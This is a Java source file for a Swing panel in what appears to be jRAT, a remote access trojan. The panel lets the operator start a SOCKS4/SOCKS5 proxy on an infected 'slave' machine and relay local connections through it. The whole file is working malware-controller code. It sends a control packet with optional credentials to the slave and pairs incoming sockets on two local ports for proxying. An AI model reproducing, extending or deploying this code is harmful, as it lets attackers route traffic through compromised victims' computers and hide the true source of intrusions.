package jrat.module.socks.ui;

import jrat.api.ui.ClientPanel;
import jrat.controller.Slave;
import jrat.module.socks.ClientThread;
import jrat.module.socks.PacketControl;

import javax.swing.ButtonGroup;
import javax.swing.GroupLayout;
import javax.swing.GroupLayout.Alignment;
import javax.swing.JButton;
import javax.swing.JCheckBox;
import javax.swing.JLabel;
import javax.swing.JRadioButton;
import javax.swing.JSpinner;
import javax.swing.JTextField;
import javax.swing.LayoutStyle.ComponentPlacement;
import javax.swing.SpinnerNumberModel;
import java.awt.Color;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.net.ServerSocket;
import java.net.Socket;

@SuppressWarnings("serial")
public class FrameSocks extends ClientPanel {

	private JRadioButton rdbtnSocks5;
	private JRadioButton rdbtnSocks4;
	private ButtonGroup socksGroup = new ButtonGroup();
	private JTextField txtUser;
	private JTextField txtPass;
	private JCheckBox chckbxUseAuthentication;
	private JSpinner spinner;
	private JLabel lbl;
	private JButton btnStop;
	private JButton btnStart;
	private JSpinner spinner_1;
	private ServerSocket socksServer;
	private ServerSocket incomingSocksConnection;

	public FrameSocks(Slave slave) {
	    super(slave, "Socks", null);

		setBounds(100, 100, 337, 235);

		rdbtnSocks5 = new JRadioButton("SOCKS5");
		rdbtnSocks5.setSelected(true);
		socksGroup.add(rdbtnSocks5);
		
		rdbtnSocks4 = new JRadioButton("SOCKS4");
		socksGroup.add(rdbtnSocks4);
		
		chckbxUseAuthentication = new JCheckBox("Use authentication");
		chckbxUseAuthentication.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				boolean auth = chckbxUseAuthentication.isSelected();
				txtUser.setEnabled(auth);
				txtPass.setEnabled(auth);
			}
		});
		
		JLabel lblHost = new JLabel("Incoming connection port:");
		
		spinner = new JSpinner();
		spinner.setModel(new SpinnerNumberModel(1080, 1, 65535, 1));
		
		JLabel lblUser = new JLabel("User:");
		
		txtUser = new JTextField();
		txtUser.setEnabled(false);
		txtUser.setColumns(10);
		
		JLabel lblPass = new JLabel("Pass:");
		
		txtPass = new JTextField();
		txtPass.setEnabled(false);
		txtPass.setColumns(10);
		
		btnStart = new JButton("Start");
		btnStart.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				toggle(true);
			}
		});
		
		lbl = new JLabel("Idle...");
		
		btnStop = new JButton("Stop");
		btnStop.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				toggle(false);
			}
		});
		btnStop.setEnabled(false);
		
		spinner_1 = new JSpinner();
		spinner_1.setModel(new SpinnerNumberModel(1081, 0, 65535, 1));
		
		JLabel lblIncomingPort = new JLabel("Local Proxy Port:");
		GroupLayout gl_contentPane = new GroupLayout(this);
		gl_contentPane.setHorizontalGroup(
			gl_contentPane.createParallelGroup(Alignment.LEADING)
				.addGroup(gl_contentPane.createSequentialGroup()
					.addContainerGap()
					.addGroup(gl_contentPane.createParallelGroup(Alignment.LEADING)
						.addGroup(gl_contentPane.createSequentialGroup()
							.addGroup(gl_contentPane.createParallelGroup(Alignment.LEADING)
								.addGroup(gl_contentPane.createSequentialGroup()
									.addComponent(lbl)
									.addPreferredGap(ComponentPlacement.RELATED, 179, Short.MAX_VALUE)
									.addComponent(btnStop)
									.addPreferredGap(ComponentPlacement.RELATED)
									.addComponent(btnStart))
								.addGroup(gl_contentPane.createSequentialGroup()
									.addComponent(lblIncomingPort)
									.addPreferredGap(ComponentPlacement.RELATED)
									.addComponent(spinner_1, GroupLayout.PREFERRED_SIZE, 71, GroupLayout.PREFERRED_SIZE))
								.addGroup(gl_contentPane.createSequentialGroup()
									.addComponent(lblHost)
									.addPreferredGap(ComponentPlacement.RELATED)
									.addComponent(spinner, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE)))
							.addContainerGap(GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))
						.addGroup(gl_contentPane.createSequentialGroup()
							.addGroup(gl_contentPane.createParallelGroup(Alignment.LEADING)
								.addGroup(gl_contentPane.createParallelGroup(Alignment.TRAILING, false)
									.addGroup(gl_contentPane.createSequentialGroup()
										.addComponent(lblPass)
										.addGap(10)
										.addComponent(txtPass, GroupLayout.PREFERRED_SIZE, 251, GroupLayout.PREFERRED_SIZE))
									.addGroup(gl_contentPane.createSequentialGroup()
										.addComponent(lblUser)
										.addPreferredGap(ComponentPlacement.UNRELATED)
										.addComponent(txtUser, 253, 253, 253)))
								.addGroup(gl_contentPane.createSequentialGroup()
									.addComponent(rdbtnSocks5)
									.addPreferredGap(ComponentPlacement.RELATED)
									.addComponent(rdbtnSocks4, GroupLayout.PREFERRED_SIZE, 65, GroupLayout.PREFERRED_SIZE)
									.addPreferredGap(ComponentPlacement.UNRELATED)
									.addComponent(chckbxUseAuthentication)))
							.addContainerGap(22, Short.MAX_VALUE))))
		);
		gl_contentPane.setVerticalGroup(
			gl_contentPane.createParallelGroup(Alignment.LEADING)
				.addGroup(gl_contentPane.createSequentialGroup()
					.addContainerGap()
					.addGroup(gl_contentPane.createParallelGroup(Alignment.BASELINE)
						.addComponent(lblHost)
						.addComponent(spinner, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE))
					.addPreferredGap(ComponentPlacement.RELATED)
					.addGroup(gl_contentPane.createParallelGroup(Alignment.BASELINE)
						.addComponent(spinner_1, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE)
						.addComponent(lblIncomingPort))
					.addPreferredGap(ComponentPlacement.RELATED, 17, Short.MAX_VALUE)
					.addGroup(gl_contentPane.createParallelGroup(Alignment.BASELINE)
						.addComponent(rdbtnSocks5)
						.addComponent(rdbtnSocks4)
						.addComponent(chckbxUseAuthentication))
					.addPreferredGap(ComponentPlacement.UNRELATED)
					.addGroup(gl_contentPane.createParallelGroup(Alignment.BASELINE)
						.addComponent(lblUser)
						.addComponent(txtUser, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE))
					.addGroup(gl_contentPane.createParallelGroup(Alignment.LEADING)
						.addGroup(gl_contentPane.createSequentialGroup()
							.addPreferredGap(ComponentPlacement.RELATED)
							.addComponent(lblPass))
						.addGroup(gl_contentPane.createSequentialGroup()
							.addGap(7)
							.addComponent(txtPass, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE)))
					.addPreferredGap(ComponentPlacement.UNRELATED)
					.addGroup(gl_contentPane.createParallelGroup(Alignment.BASELINE)
						.addComponent(btnStart)
						.addComponent(lbl)
						.addComponent(btnStop))
					.addContainerGap())
		);
		setLayout(gl_contentPane);
	}
	
	private void toggle(boolean start) {
		try {
			btnStop.setEnabled(start);
			btnStart.setEnabled(!start);
			
			if (start) {
				boolean socks5 = rdbtnSocks5.isSelected();
				boolean auth = chckbxUseAuthentication.isSelected();
				String user = txtUser.getText();
				String pass = txtPass.getText();
				final int port = (Integer) spinner_1.getValue();
				final int incomingPort = (Integer) spinner.getValue();
				
				slave.addToSendQueue(new PacketControl(socks5, auth, user, pass, incomingPort));

				new Thread(new Runnable() {
					public void run() {
						try {
							socksServer = new ServerSocket(port);
							incomingSocksConnection = new ServerSocket(incomingPort);

							while (btnStop.isEnabled()) {
								Socket s1 = incomingSocksConnection.accept();
								s1.setKeepAlive(true);
								
								Socket s = socksServer.accept();
								s.setKeepAlive(true);

                                if (!btnStop.isEnabled()) {
									s.close();
									s1.close();
									break;
								}
								
								new ClientThread(s, s1).start();
							}
							
							socksServer.close();
							incomingSocksConnection.close();
						} catch (Exception ex) {						
							ex.printStackTrace();
						}
					}
				}).start();
			} else {
				slave.addToSendQueue(new PacketControl(false));
				
				socksServer.close();
				incomingSocksConnection.close();
			}
						
		} catch (Exception ex) {
			ex.printStackTrace();
			btnStop.setEnabled(false);
			btnStart.setEnabled(true);
		}
	}

	public void setLabelColor(Color color) {
		lbl.setForeground(color);
	}

	public void setLabelText(String s) {
		lbl.setText(s);
	}
}
